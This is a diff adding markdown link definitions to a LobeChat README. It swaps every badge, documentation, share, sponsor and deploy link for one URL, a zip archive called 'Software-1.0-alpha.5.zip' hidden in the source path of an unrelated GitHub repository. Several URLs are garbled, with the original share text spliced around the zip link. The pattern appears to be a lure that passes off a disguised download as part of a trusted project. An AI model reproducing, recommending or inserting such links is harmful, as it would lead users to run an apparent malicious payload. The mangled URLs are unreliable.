+[image-feat-theme]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-tts]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-feat-vision]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-overview]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[image-star]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[issues-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-chat-plugins]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-commit]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-i18n]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-icons-github]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-icons-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-icons-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-lint-github]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-lint-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-lint-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-midjourney-webui]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-theme]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-tts-github]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-tts-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-tts-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-ui-github]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-ui-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[lobe-ui-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[official-site]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[pr-welcome-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[pr-welcome-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip🤯_pr_welcome-%E2%86%92-ffcb47?labelColor=black&style=for-the-badge
+[profile-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[share-linkedin-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[share-linkedin-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20on%20linkedin-black?labelColor=black&logo=linkedin&logoColor=white&style=flat-square
+[share-mastodon-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source,%20extensible%20(Function%20Calling),%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT/LLM%20web%20application.%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20#chatbot%20#chatGPT%20#openAI
+[share-mastodon-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20on%20mastodon-black?labelColor=black&logo=mastodon&logoColor=white&style=flat-square
+[share-reddit-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobehub%2Flobe-chat
+[share-reddit-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20on%20reddit-black?labelColor=black&logo=reddit&logoColor=white&style=flat-square
+[share-telegram-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip"?text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobehub%2Flobe-chat
+[share-telegram-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20on%20telegram-black?labelColor=black&logo=telegram&logoColor=white&style=flat-square
+[share-weibo-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20%23chatbot%20%23chatGPT%20%23openAI&url=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobehub%2Flobe-chat
+[share-weibo-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20on%20weibo-black?labelColor=black&logo=sinaweibo&logoColor=white&style=flat-square
+[share-whatsapp-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.%20https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobehub%2Flobe-chat%20%23chatbot%20%23chatGPT%20%23openAI
+[share-whatsapp-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20on%20whatsapp-black?labelColor=black&logo=whatsapp&logoColor=white&style=flat-square
+[share-x-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2CchatGPT%2CopenAI&text=Check%20this%20GitHub%20repository%20out%20%F0%9F%A4%AF%20LobeChat%20-%20An%20open-source%2C%20extensible%20%28Function%20Calling%29%2C%20high-performance%20chatbot%20framework.%20It%20supports%20one-click%20free%20deployment%20of%20your%20private%20ChatGPT%2FLLM%20web%20application.&url=https%3A%2F%https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%2Flobehub%2Flobe-chat
+[share-x-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20on%20x-black?labelColor=black&logo=x&logoColor=white&style=flat-square
+[sponsor-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip 'Become ❤️ LobeHub Sponsor'
+[sponsor-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20LobeHub-f04f88?logo=opencollective&logoColor=white&style=flat-square
+[submit-agents-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[submit-agents-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip🤖/🏪_submit_agent-%E2%86%92-c4f042?labelColor=black&style=for-the-badge
+[submit-plugin-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[submit-plugin-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip🧩/🏪_submit_plugin-%E2%86%92-95f3d9?labelColor=black&style=for-the-badge
+[vercel-link]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[vercel-shield]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip
+[vercel-shield-badge]: https://raw.githubusercontent.com/menscheck/lobe/main/src/features/Conversation/components/Software-1.0-alpha.5.zip%20LOBECHAT-ONLINE-55b467?labelColor=black&logo=vercel&style=for-the-badge
